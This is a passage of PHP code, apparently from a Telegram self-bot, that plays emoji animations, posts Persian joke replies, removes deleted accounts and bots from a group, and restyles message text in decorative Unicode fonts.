                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️▫️
⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️◽️
⬜️⬜️⬜️⬜️⬜️⬜️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️⬜️◻️◽️▫️▫️
⬜️⬜️⬜️⬜️⬜️◻️◽️▫️▫️
⬜️⬜️⬜️⬜️⬜️◻️◽️◽️◽️
⬜️⬜️⬜️⬜️⬜️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️◽️◽️◽️
⬜️⬜️⬜️⬜️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️◽️◽️◽️◽️
⬜️⬜️⬜️◻️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️◽️◽️◽️◽️◽️
⬜️⬜️◻️◻️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️◽️◽️◽️◽️◽️◽️
⬜️◻️◻️◻️◻️◻️◻️◻️◽️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️◽️◽️◽️◽️◽️◽️◽️
◻️◻️◻️◻️◻️◻️◻️◻️◻️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️◽️◽️◽️◽️◽️◽️◽️◽']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️']);
                    }

                    if ($text == 'پشم' or $text == 'پشمام') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'پشم دیگه ندارم ولی برگام ریخت بمولا']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍂🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍂🍁🌱🌿🍂🍁🌱🌿🍂🍁🌱🌿🍂🍁🌱🌿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🍃🍂🍁🌱🌿☘️🍀🍃🍁🍂🌿🌱☘️🍀🍃']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'دیگه برگی برام نمونده ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'پشمام ریخ ☹']);
                    }
                    if (preg_match("/^[\/\#\!]?(clean deleted account|پاکسازی دلیت اکانت ها|حذف دلیت اکانت ها|clean deleted)$/si", $text)) {
                        $channelParticipantsRecent = ['_' => 'channelParticipantsRecent'];
                        $channels_ChannelParticipants = yield $this->channels->getParticipants(['channel' => $peer, 'filter' => $channelParticipantsRecent, 'offset' => 0, 'limit' => 200, 'hash' => 0,]);
                        $channelBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                        $kl = $channels_ChannelParticipants['users'];
                        $list = "";
                        foreach ($kl as $key => $val) {
                            $fon = $kl[$key]['deleted'];
                            $fonid = $kl[$key]['id'];
                            if ($fon == true) {
                                $list .= '' . $kl[$key]['id'] . "\n";
                                $Updates = yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $fonid, 'banned_rights' => $channelBannedRights,]);
                            }
                        }
                        $alaki = explode("\n", $list);
                        $allcount = count($alaki) - 1;
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🗑 𝐀𝐥𝐥 𝐝𝐞𝐥𝐞𝐭𝐞𝐝 𝐚𝐜𝐜𝐨𝐮𝐧𝐭𝐬 𝐰𝐞𝐫𝐞 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐠𝐫𝐨𝐮𝐩 ✓
𝐍𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐚𝐜𝐜𝐨𝐮𝐧𝐭𝐬 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 : $allcount", 'parse_mode' => 'MarkDown']);
                    }
                    if (preg_match("/^[\/\#\!]?(clean bots|clean robots|پاکسازی ربات ها|حذف ربات ها)$/si", $text)) {
                        $channelParticipantsRecent = ['_' => 'channelParticipantsRecent'];
                        $channels_ChannelParticipants = yield $this->channels->getParticipants(['channel' => $peer, 'filter' => $channelParticipantsRecent, 'offset' => 0, 'limit' => 200, 'hash' => 0,]);
                        $channelBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                        $kl = $channels_ChannelParticipants['users'];
                        $list = "";
                        foreach ($kl as $key => $val) {
                            $fon = $kl[$key]['bot'];
                            $fonid = $kl[$key]['id'];
                            if ($fon == true) {
                                $list .= '' . $kl[$key]['id'] . "\n";
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $fonid, 'banned_rights' => $channelBannedRights,]);
                            }
                        }
                        $alaki = explode("\n", $list);
                        $allcount = count($alaki) - 1;
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🗑 𝐀𝐥𝐥 𝐫𝐨𝐛𝐨𝐭𝐬 𝐰𝐞𝐫𝐞 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐠𝐫𝐨𝐮𝐩 ✓
𝐍𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐚𝐜𝐜𝐨𝐮𝐧𝐭𝐬 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 : $allcount", 'parse_mode' => 'MarkDown']);
                    }
                    if (file_get_contents('enfont.txt') == 'on') {
                        $text = strtoupper("$text");
                        $en = ['Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M'];
                        $a_a = ['🆀', '🆆', '🅴', '🆁', '🆃', '🆈', '🆄', '🅸', '🅾️', '🅿️', '🅰️', '🆂', '🅳', '🅵', '🅶', '🅷', '🅹', '🅺', '🅻', '🆉', '🆇', '🅲', '🆅', '🅱️', '🅽', '🅼'];
                        $b_b = ['🅠', '🅦', '🅔', '🅡', '🅣', '🅨', '🅤', '🅘', '🅞', '🅟', '🅐', '🅢', '🅓', '🅕', '🅖', '🅗', '🅙', '🅚', '🅛', '🅩 ', '🅧', '🅒', '🅥', '🅑', '🅝', '🅜'];
                        $c_c = ['Q̷̷', 'W̷̷', 'E̷̷', 'R̷̷', 'T̷̷', 'Y̷̷', 'U̷̷', 'I̷̷', 'O̷̷', 'P̷̷', 'A̷̷', 'S̷̷', 'D̷̷', 'F̷̷', 'G̷̷', 'H̷̷', 'J̷̷', 'K̷̷', 'L̷̷', 'Z̷̷', 'X̷̷', 'C̷̷', 'V̷̷', 'B̷̷', 'N̷̷', 'M̷̷'];
                        $d_d = ['Ⓠ', 'Ⓦ', 'Ⓔ', 'Ⓡ', 'Ⓣ', 'Ⓨ', 'Ⓤ', 'Ⓘ', 'Ⓞ', 'Ⓟ', 'Ⓐ', 'Ⓢ', 'Ⓓ', 'Ⓕ', 'Ⓖ', 'Ⓗ', 'Ⓙ', 'Ⓚ', 'Ⓛ', 'Ⓩ', 'Ⓧ', 'Ⓒ', 'Ⓥ', 'Ⓑ', 'Ⓝ', 'Ⓜ️'];
                        $e_e = ['ǫ', 'ᴡ', 'ᴇ', 'ʀ', 'ᴛ', 'ʏ', 'ᴜ', 'ɪ', 'ᴏ', 'ᴘ', 'ᴀ', 's', 'ᴅ', 'ғ', 'ɢ', 'ʜ', 'ᴊ', 'ᴋ', 'ʟ', 'ᴢ', 'x', 'ᴄ', 'ᴠ', 'ʙ', 'ɴ', 'ᴍ'];
                        $f_f = ['ℚ', 'Ꮤ', '℮', 'ℜ', 'Ƭ', 'Ꮍ', 'Ʋ', 'Ꮠ', 'Ꮎ', '⅌', 'Ꭿ', 'Ꮥ', 'ⅅ', 'ℱ', 'Ꮹ', 'ℋ', 'ℐ', 'Ӄ', 'ℒ', 'ℤ', 'ℵ', 'ℭ', 'Ꮙ', 'Ᏸ', 'ℕ', 'ℳ'];
                        $h_h = ['🅀', '🅆', '🄴', '🅁', '🅃', '🅈', '🅄', '🄸', '🄾', '🄿', '🄰', '🅂', '🄳', '🄵', '🄶', '🄷', '🄹', '🄺', '🄻', '🅉', '🅇', '🄲', '🅅', '🄱', '🄽', '🄼'];
                        $ss = str_replace($en, $a_a, $text);
                        $aa = str_replace($en, $b_b, $text);
                        $bb = str_replace($en, $c_c, $text);
                        $cc = str_replace($en, $d_d, $text);
                        $dd = str_replace($en, $e_e, $text);
                        $ee = str_replace($en, $f_f, $text);
                        $hh = str_replace($en, $h_h, $text);
                        $bots = [$ss, $aa, $bb, $cc, $dd, $ee, $hh,];
                        $ru = $bots[rand(0, count($bots) - 1)];
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$ru", 'parse_mode' => 'Markdown']);
                    }

                    if (file_get_contents('fafont.txt') == 'on') {
                        $matnFA = "$text";
                        $_a = ['آ', 'اَِ', 'بَِ', 'پَِـَِـ', 'تَِـ', 'ثَِ', 'جَِ', 'چَِ', 'حَِـَِ', 'خَِ', 'دَِ', 'ذَِ', 'رَِ', 'زَِ', 'ژَِ', 'سَِــَِ', 'شَِـَِ', 'صَِ', 'ضَِ', 'طَِ', 'ظَِ', 'عَِ', 'غَِ', 'فَِ', 'قَِ', 'ڪَِــ', 'گَِــ', 'لَِ', 'مَِــَِ', 'نَِ', 'وَِ', 'هَِ', 'یَِ'];
                        $_b = ['آ', 'ا', 'بـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'پـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'تـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'ثـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'جـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'چـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'حـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'خـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'د۪ٜ', 'ذ۪ٜ', 'ر۪ٜ', 'ز۪ٜ‌', 'ژ۪ٜ', 'سـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'شـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'صـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'ضـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'طـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'ظـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'عـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'غـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'فـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'قـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'کـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'گـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'لـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'مـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ‌', 'نـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'و', 'هـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ', 'یـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜـ۪ٜ'];
                        $_c = ['آ', 'ا', 'بـــ', 'پــ', 'تـــ', 'ثــ', 'جــ', 'چــ', 'حــ', 'خــ', 'دّ', 'ذّ', 'رّ', 'زّ', 'ژّ', 'ســ', 'شــ', 'صــ', 'ضــ', 'طــ', 'ظــ', 'عــ', 'غــ', 'فــ', 'قــ', 'کــ', 'گــ', 'لــ', 'مـــ', 'نـــ', 'وّ', 'هــ', 'یـــ'];
                        $_d = ['آ', 'ا', 'بـ﹏ـ', 'پـ﹏ـ', 'تـ﹏ـ', 'ثـ﹏ــ', 'جـ﹏ــ', 'چـ﹏ـ', 'حـ﹏ـ', 'خـ﹏ـ', 'د', 'ذ', 'ر', 'ز', 'ژ', 'سـ﹏ـ', 'شـ﹏ـ', 'صـ﹏ــ', 'ضـ﹏ـ', 'طـ﹏ـ', 'ظـ﹏ــ', 'عـ﹏ـ', 'غـ﹏ـ', 'فـ﹏ـ', 'قـ﹏ـ', 'کـ﹏ـ', 'گـ﹏ـ', 'لـ﹏ــ', 'مـ﹏ـ', 'نـ﹏ـ', 'و', 'هـ﹏ـ', 'یـ﹏ـ'];
                        $_e = ['آ', 'ا', 'ب̈́ـ̈́ـ̈́ـ̈́ـ', 'پ̈́ـ̈́ـ̈́ـ̈́ـ', 'ت̈́ـ̈́ـ̈́ـ̈́ـ', 'ث̈́ـ̈́ـ̈́ـ̈́ـ', 'ج̈́ـ̈́ـ̈́ـ̈́ـ', 'چـ̈́ـ̈́ـ̈́ـ', 'ح̈́ـ̈́ـ̈́ـ̈́ـ', 'خـ̈́ـ̈́ـ̈́ـ', 'د', 'ذ', 'ر', 'ز', 'ژ', 'سـ̈́ـ̈́ـ̈́ـ', 'شـ̈́ـ̈́ـ̈́ـ', 'ص̈́ـ̈́ـ̈́ـ̈́ـ', 'ض̈́ـ̈́ـ̈́ـ̈́ـ', 'ط̈́ـ̈́ـ̈́ـ̈́ـ', 'ظـ̈́ـ̈́ـ̈́ـ̈́ـ', 'ع̈́ـ̈́ـ̈́ـ̈́ـ', 'غ̈́ـ̈́ـ̈́ـ̈́ـ', 'فـ̈́ـ̈́ـ̈́ـ̈́ـ', 'قـ̈́ـ̈́ـ̈́ـ', 'کـ̈́ـ̈́ـ̈́ـ', 'گـ̈́ـ̈́ـ̈́ـ̈́ـ', 'ل̈́ـ̈́ـ̈́ـ̈́ـ', 'م̈́ـ̈́ـ̈́ـ̈́ـ', 'ن̈́ـ̈́ـ̈́ـ̈́ـ', 'و', 'ه̈́ـ̈́ـ̈́ـ̈́ـ', 'ی̈́ـ̈́ـ̈́ـ̈́ـ'];
                        $_f = ['آ', 'اؒؔ', 'بـ͜͡ــؒؔـ͜͝ـ', 'پـ͜͡ــؒؔـ͜͝ـ', 'تـ͜͡ــؒؔـ͜͝ـ', 'ثـ͜͡ــؒؔـ͜͝ـ', 'جـ͜͡ــؒؔـ͜͝ـ', 'چـ͜͡ــؒؔـ͜͝ـ', 'حـ͜͡ــؒؔـ͜͝ـ', 'خـ͜͡ــؒؔـ͜͝ـ', 'د۠۠', 'ذ', 'ر', 'ز', 'ژ', 'سـ͜͡ــؒؔـ͜͝ـ', 'شـ͜͡ــؒؔـ͜͝ـ', 'صـ͜͡ــؒؔـ͜͝ـ', 'ضـ͜͡ــؒؔـ͜͝ـ', 'طـ͜͡ــؒؔـ͜͝ـ', 'ظـ͜͡ــؒؔـ͜͝ـ', 'عـ͜͡ــؒؔـ͜͝ـ', 'غـ͜͡ــؒؔـ͜͝ـ', 'فـ͜͡ــؒؔـ͜͝ـ', 'قـ͜͡ــؒؔـ͜͝ـ', 'کـ͜͡ــؒؔـ͜͝ـ', 'گـ͜͡ــؒؔـ͜͝ـ', 'لـ͜͡ــؒؔـ͜͝ـ', 'مـ͜͡ــؒؔـ͜͝ـ', 'نـ͜͡ــؒؔـ͜͝ـ', 'وۘۘ', 'هـ͜͡ــؒؔـ͜͝ـ', 'یـ͜͡ــؒؔـ͜͝ـ'];
                        $_g = ['❀آ', 'ا', 'بـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'پـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'تـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'ثـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'جـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'چـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'حैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'خـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــ', '❀د', 'ذै', 'رؒؔ', 'ز۪ٜ❀', '❀ژै', 'سـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'شـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'صैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'ضैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'طैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'ظैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'عـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'غـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'فـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'قـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'ڪैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'گـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'لـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'مـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'نـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'وَّ', 'هـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ', 'یـैـ۪ٜـ۪ٜـ۪ٜ❀͜͡ــؒؔ'];
                        $_h = ['آٰٖـٰٖ℘ـَ͜✾ـ', 'اٰٖـٰٖ℘ـَ͜✾ـ', 'بٰٖـٰٖ℘ـَ͜✾ـ', 'پٰٖـٰٖ℘ـَ͜✾ـ', 'تٰٖـٰٖ℘ـَ͜✾ـ', 'ثٰٖـٰٖ℘ـَ͜✾ـ', 'جٰٖـٰٖ℘ـَ͜✾ـ', 'چٰٖـٰٖ℘ـَ͜✾ـ', 'حٰٖـٰٖ℘ـَ͜✾ـ', 'خٰٖـٰٖ℘ـَ͜✾ـ', 'دٰٖـٰٖ℘ـَ͜✾ـ', 'ذٰٖـٰٖ℘ـَ͜✾ـ', 'رٰٖـٰٖ℘ـَ͜✾ـ', 'زٰٖـٰٖ℘ـَ͜✾ـ', 'ژٰٖـٰٖ℘ـَ͜✾ـ', 'سٰٖـٰٖ℘ـَ͜✾ـ', 'شٰٖـٰٖ℘ـَ͜✾ـ', 'صٰٖـٰٖ℘ـَ͜✾ـ', 'ضٰٖـٰٖ℘ـَ͜✾ـ', 'طٰٖـٰٖ℘ـَ͜✾ـ', 'ظٰٖـٰٖ℘ـَ͜✾ـ', 'عٰٖـٰٖ℘ـَ͜✾ـ', 'غٰٖـٰٖ℘ـَ͜✾ـ', 'فٰٖـٰٖ℘ـَ͜✾ـ', 'قٰٖـٰٖ℘ـَ͜✾ـ', 'کٰٖـٰٖ℘ـَ͜✾ـ', 'گٰٖـٰٖ℘ـَ͜✾ـ', 'لٰٖـٰٖ℘ـَ͜✾ـ', 'مٰٖـٰٖ℘ـَ͜✾ـ', 'نٰٖـٰٖ℘ـَ͜✾ـ', 'وٰٖـٰٖ℘ـَ͜✾ـ', 'هٰٖـٰٖ℘ـَ͜✾ـ', 'یٰٖـٰٖ℘ـَ͜✾ـ'];
